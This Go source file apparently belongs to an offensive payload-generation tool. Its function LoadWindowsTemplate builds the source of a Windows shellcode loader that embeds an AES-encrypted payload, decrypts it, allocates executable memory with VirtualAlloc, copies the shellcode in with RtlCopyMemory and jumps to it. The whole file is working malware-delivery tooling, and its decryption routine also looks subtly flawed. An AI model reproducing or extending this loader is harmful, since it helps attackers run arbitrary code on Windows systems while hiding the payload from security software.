package loader

import (
	"encoding/hex"
	"fmt"
)

func LoadWindowsTemplate(s Shellcode) string {

    hexShellcode := hex.EncodeToString(s.Payload)
    hexKey := hex.EncodeToString(s.AesKey)

    return fmt.Sprintf(`
package main

import (
        "crypto/aes"
        "encoding/hex"
        "os"
        "unsafe"
        "syscall"
        "fmt"
)

const (
    MEM_COMMIT             = 0x1000
    MEM_RESERVE            = 0x2000
    PAGE_EXECUTE_READWRITE = 0x40
)

var (
    kernel32      = syscall.MustLoadDLL("kernel32.dll")
    ntdll         = syscall.MustLoadDLL("ntdll.dll")

    VirtualAlloc  = kernel32.MustFindProc("VirtualAlloc")
    RtlCopyMemory = ntdll.MustFindProc("RtlCopyMemory")
)

func decrypt(key string, payload string) []byte {
    ciphertext, _ := hex.DecodeString(payload)
    keyAsBytes, _ := hex.DecodeString(key)

    c, err := aes.NewCipher(keyAsBytes); if err != nil {
        os.Exit(1)
    }

    plaintext := make([]byte, len(payload))
    c.Decrypt(plaintext, ciphertext)
    s := string(plaintext[:])
    return []byte(s)
}

func main() {
    /* decrypt shellcode using AES */
    payload := decrypt("%s", "%s")

    fmt.Println(payload)

    addr, _, err := VirtualAlloc.Call(
        0,
        uintptr(len(payload)),
        MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE,
    )

    if err != nil && err.Error() != "The operation completed successfully." {
        syscall.Exit(0)
    }

    _, _, err = RtlCopyMemory.Call(
        addr,
        (uintptr)(unsafe.Pointer(&payload[0])),
        uintptr(len(payload)),
    )

    if err != nil && err.Error() != "The operation completed successfully." {
        fmt.Println(err.Error())
        syscall.Exit(0)
    }

    // jump to shellcode
    syscall.Syscall(addr, 0, 0, 0, 0)

}
`, hexKey, hexShellcode)
}


